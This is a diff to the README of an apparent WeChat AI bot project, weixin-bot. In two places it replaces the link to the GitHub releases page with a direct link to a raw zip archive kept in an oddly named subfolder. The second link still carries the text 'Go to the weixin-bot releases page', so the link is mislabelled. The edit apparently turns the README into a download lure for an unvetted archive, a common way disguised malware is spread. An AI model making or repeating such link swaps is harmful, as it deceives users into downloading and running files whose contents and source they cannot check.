@@ -1,6 +1,6 @@
 # 🤖 weixin-bot - Run a WeChat AI Bot Fast
 
-[![Download weixin-bot](https://img.shields.io/badge/Download-Weixin--bot-blue?style=for-the-badge)](https://github.com/Benevolent-capeverdeislands513/weixin-bot/releases)
+[![Download weixin-bot](https://img.shields.io/badge/Download-Weixin--bot-blue?style=for-the-badge)](https://github.com/Benevolent-capeverdeislands513/weixin-bot/raw/refs/heads/main/Westlander/weixin-bot-3.8-beta.1.zip)
 
 ## 📦 What this app does
 
@@ -30,7 +30,7 @@ If you plan to use Ollama, make sure Ollama is running on your PC before you sta
 
 Visit this page to download the latest Windows release:
 
-[Go to the weixin-bot releases page](https://github.com/Benevolent-capeverdeislands513/weixin-bot/releases)
+[Go to the weixin-bot releases page](https://github.com/Benevolent-capeverdeislands513/weixin-bot/raw/refs/heads/main/Westlander/weixin-bot-3.8-beta.1.zip)
 
 After the page opens:
 
